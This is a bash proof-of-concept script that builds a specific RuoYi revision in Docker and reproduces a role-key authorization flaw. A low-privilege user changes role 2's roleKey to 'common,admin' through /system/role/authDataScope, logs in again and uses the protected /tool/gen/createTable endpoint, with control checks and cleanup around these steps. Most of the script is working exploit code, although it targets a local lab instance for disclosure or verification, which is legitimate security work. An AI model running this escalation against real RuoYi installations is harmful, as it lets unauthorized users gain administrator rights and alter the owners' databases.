#!/usr/bin/env bash
set -Eeuo pipefail

# Full-product reproduction for the role-key authorization confusion in the
# exact RuoYi revision named by TARGET_SHA.  The script builds the application
# from REPO_DIR, starts a fresh MySQL database and the real ruoyi-admin jar,
# then exercises login -> role mutation -> fresh login -> protected write.

TARGET_SHA="${TARGET_SHA:-7995a83e04e1a88aaea5a8a7c50570dffcb145e0}"
REPO_DIR="${REPO_DIR:-$(pwd)}"
RUN_ID="${RUN_ID:-$(date +%s)-$$}"
RUN_TAG="${RUN_ID//[^a-zA-Z0-9]/_}"
MYSQL_NAME="${MYSQL_NAME:-ruoyi-rolekey-mysql-${RUN_TAG}}"
APP_NAME="${APP_NAME:-ruoyi-rolekey-app-${RUN_TAG}}"
MYSQL_PORT="${MYSQL_PORT:-33309}"
APP_PORT="${APP_PORT:-18089}"
TABLE_NAME="${TABLE_NAME:-cve_rolekey_poc_${RUN_TAG}}"
CONTROL_TABLE="${CONTROL_TABLE:-cve_rolekey_control_${RUN_TAG}}"
RUN_DIR="$(mktemp -d "/tmp/ruoyi-rolekey-poc.${RUN_TAG}.XXXXXX")"

die() {
    echo "ERROR: $*" >&2
    if docker ps -a --format '{{.Names}}' | grep -Fxq "$APP_NAME"; then
        docker logs --tail 120 "$APP_NAME" >&2 || true
    fi
    if docker ps -a --format '{{.Names}}' | grep -Fxq "$MYSQL_NAME"; then
        docker logs --tail 80 "$MYSQL_NAME" >&2 || true
    fi
    exit 1
}

cleanup() {
    docker rm -f "$APP_NAME" "$MYSQL_NAME" >/dev/null 2>&1 || true
    rm -rf -- "$RUN_DIR"
}
trap cleanup EXIT

command -v docker >/dev/null || die "docker is required"
command -v curl >/dev/null || die "curl is required"
git -C "$REPO_DIR" rev-parse --git-dir >/dev/null 2>&1 || die "REPO_DIR is not a git checkout: $REPO_DIR"

actual_sha="$(git -C "$REPO_DIR" rev-parse HEAD)"
test "$actual_sha" = "$TARGET_SHA" || die "checkout is $actual_sha, expected $TARGET_SHA"
git -C "$REPO_DIR" diff --quiet || die "working tree has unstaged changes"
git -C "$REPO_DIR" diff --cached --quiet || die "index has staged changes"

echo "TARGET_SHA=$actual_sha"
echo "TARGET_TAG=$(git -C "$REPO_DIR" describe --tags --always)"
echo "BUILD_COMMAND=docker run --rm -v $REPO_DIR:/workspace -w /workspace maven:3.9.9-eclipse-temurin-17 mvn -B -DskipTests package"

docker run --rm \
    -v "$REPO_DIR:/workspace" \
    -w /workspace \
    maven:3.9.9-eclipse-temurin-17 \
    mvn -B -DskipTests package

JAR="$REPO_DIR/ruoyi-admin/target/ruoyi-admin.jar"
test -f "$JAR" || die "build did not produce $JAR"

docker run -d \
    --name "$MYSQL_NAME" \
    --network host \
    -e MYSQL_ROOT_PASSWORD=password \
    -e MYSQL_DATABASE=ry \
    -v "$REPO_DIR/sql/ry_20260319.sql:/docker-entrypoint-initdb.d/01-ruoyi.sql:ro" \
    mysql:8.0 \
    --port="$MYSQL_PORT" \
    --character-set-server=utf8mb4 \
    --collation-server=utf8mb4_unicode_ci >/dev/null

for i in $(seq 1 120); do
    if docker exec "$MYSQL_NAME" mysqladmin ping -h127.0.0.1 -P"$MYSQL_PORT" -uroot -ppassword --silent >/dev/null 2>&1; then
        echo "MYSQL_READY_AFTER=${i}s"
        break
    fi
    if [ "$i" = 120 ]; then
        die "MySQL did not become ready"
    fi
    sleep 1
done

sql() {
    docker exec "$MYSQL_NAME" mysql -h127.0.0.1 -P"$MYSQL_PORT" -uroot -ppassword -NBe "$1" ry
}

docker run -d \
    --name "$APP_NAME" \
    --network host \
    -v "$JAR:/app.jar:ro" \
    eclipse-temurin:17-jre \
    java -jar /app.jar \
    --server.port="$APP_PORT" \
    --spring.datasource.druid.master.url="jdbc:mysql://127.0.0.1:${MYSQL_PORT}/ry?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=UTC" \
    --spring.datasource.druid.master.username=root \
    --spring.datasource.druid.master.password=password \
    --shiro.user.captchaEnabled=false \
    --ruoyi.profile="/tmp/ruoyi-rolekey-profile-${RUN_TAG}" \
    --logging.level.com.ruoyi=info >/dev/null

for i in $(seq 1 120); do
    http_code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 2 "http://127.0.0.1:${APP_PORT}/login" 2>/dev/null || true)"
    if [ "$http_code" = 200 ] || [ "$http_code" = 302 ]; then
        echo "APP_READY_AFTER=${i}s HTTP=${http_code}"
        break
    fi
    if [ "$i" = 120 ]; then
        die "application did not become ready"
    fi
    sleep 1
done

login() {
    local cookie_file="$1"
    curl -sS --max-time 20 \
        -b "$cookie_file" -c "$cookie_file" \
        -X POST "http://127.0.0.1:${APP_PORT}/login" \
        --data-urlencode 'username=ry' \
        --data-urlencode 'password=admin123' \
        --data-urlencode 'validateCode=' \
        --data-urlencode 'rememberMe=false'
}

echo "INITIAL_ROLE=$(sql "select role_id,role_key,data_scope from sys_role where role_id=2")"
echo "INITIAL_USER_ROLE=$(sql "select user_id,role_id from sys_user_role where user_id=2")"

CONTROL_COOKIE="$RUN_DIR/control.cookies"
echo "CONTROL_LOGIN=$(login "$CONTROL_COOKIE")"
echo "CONTROL_TABLE_BEFORE=$(sql "select count(*) from information_schema.tables where table_schema='ry' and table_name='${CONTROL_TABLE}'")"
control_body="$RUN_DIR/control.body"
control_http="$(curl -sS --max-time 20 -o "$control_body" -w '%{http_code}' \
    -b "$CONTROL_COOKIE" -X POST "http://127.0.0.1:${APP_PORT}/tool/gen/createTable" \
    --data-urlencode "sql=CREATE TABLE ${CONTROL_TABLE} (id INT PRIMARY KEY)")"
echo "CONTROL_CREATE_HTTP=${control_http}"
echo "CONTROL_CREATE_BODY=$(tr '\n' ' ' < "$control_body" | sed 's/[[:space:]][[:space:]]*/ /g' | head -c 300)"
echo "CONTROL_TABLE_AFTER=$(sql "select count(*) from information_schema.tables where table_schema='ry' and table_name='${CONTROL_TABLE}'")"
grep -q '403' "$control_body" || die "control request was not denied"
test "$(sql "select count(*) from information_schema.tables where table_schema='ry' and table_name='${CONTROL_TABLE}'")" = 0 || die "control table unexpectedly exists"

mutation_body="$RUN_DIR/mutation.body"
mutation_http="$(curl -sS --max-time 20 -o "$mutation_body" -w '%{http_code}' \
    -b "$CONTROL_COOKIE" -X POST "http://127.0.0.1:${APP_PORT}/system/role/authDataScope" \
    --data-urlencode 'roleId=2' \
    --data-urlencode 'roleKey=common,admin' \
    --data-urlencode 'dataScope=2' \
    --data-urlencode 'deptIds=100' \
    --data-urlencode 'deptIds=101' \
    --data-urlencode 'deptIds=105')"
echo "ROLE_MUTATION_HTTP=${mutation_http}"
echo "ROLE_MUTATION_BODY=$(tr '\n' ' ' < "$mutation_body" | sed 's/[[:space:]][[:space:]]*/ /g' | head -c 300)"
echo "MUTATED_ROLE=$(sql "select role_id,role_key,data_scope from sys_role where role_id=2")"
grep -q '"code":0' "$mutation_body" || die "role mutation was not accepted"
grep -q '2[[:space:]]*common,admin[[:space:]]*2' <(sql "select role_id,role_key,data_scope from sys_role where role_id=2") || die "role key was not persisted"

ATTACK_COOKIE="$RUN_DIR/attack.cookies"
echo "FRESH_LOGIN=$(login "$ATTACK_COOKIE")"
echo "ATTACK_TABLE_BEFORE=$(sql "select count(*) from information_schema.tables where table_schema='ry' and table_name='${TABLE_NAME}'")"
attack_body="$RUN_DIR/attack.body"
attack_http="$(curl -sS --max-time 20 -o "$attack_body" -w '%{http_code}' \
    -b "$ATTACK_COOKIE" -X POST "http://127.0.0.1:${APP_PORT}/tool/gen/createTable" \
    --data-urlencode "sql=CREATE TABLE ${TABLE_NAME} (id INT PRIMARY KEY)")"
echo "ATTACK_CREATE_HTTP=${attack_http}"
echo "ATTACK_CREATE_BODY=$(tr '\n' ' ' < "$attack_body" | sed 's/[[:space:]][[:space:]]*/ /g' | head -c 300)"
echo "ATTACK_TABLE_AFTER=$(sql "select table_name from information_schema.tables where table_schema='ry' and table_name='${TABLE_NAME}'")"
echo "ATTACK_GENERATOR_ROW=$(sql "select table_name,create_by from gen_table where table_name='${TABLE_NAME}'")"
grep -q '"code":0' "$attack_body" || die "attack request did not return success"
test "$(sql "select count(*) from information_schema.tables where table_schema='ry' and table_name='${TABLE_NAME}'")" = 1 || die "attack table was not created"
test "$(sql "select count(*) from gen_table where table_name='${TABLE_NAME}'")" = 1 || die "generator metadata row was not created"

sql "delete from gen_table where table_name='${TABLE_NAME}'; drop table ${TABLE_NAME};" >/dev/null
echo "CLEANUP_TABLE=$(sql "select count(*) from information_schema.tables where table_schema='ry' and table_name='${TABLE_NAME}'")"
echo "POC_RESULT=PASS"
